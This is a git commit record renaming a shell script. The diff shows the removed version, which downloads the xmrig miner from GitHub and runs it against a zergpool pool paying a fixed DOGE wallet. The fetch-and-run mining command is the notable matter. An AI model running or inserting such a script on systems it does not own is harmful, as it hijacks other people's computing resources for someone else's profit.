dfdad2fdd78def8f6b42ca0f93a4323faa1e56d1
postsnarrator <kapilramudamu04@gmail.com>
2021-06-12 17:36:17 +0530

    Update and rename +Dejavu.sh to dejavu.sh

--- +Dejavu.sh
+++
@@ -1,5 +0,0 @@
-#Dejavu
-sudo apt update
-wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz && tar -xf xmrig-6.12.2-linux-x64.tar.gz && cd xmrig-6.12.2
-
-./xmrig -a cryptonight-upx/2 -o stratum+tcp://cryptonight_upx.mine.zergpool.com:4457 -u D6EUU5hyBF4N41AsYC6rVisauNMPwdAUP1 --keepalive --timeout 120 --donate-level 0 -p c=DOGE,ID=
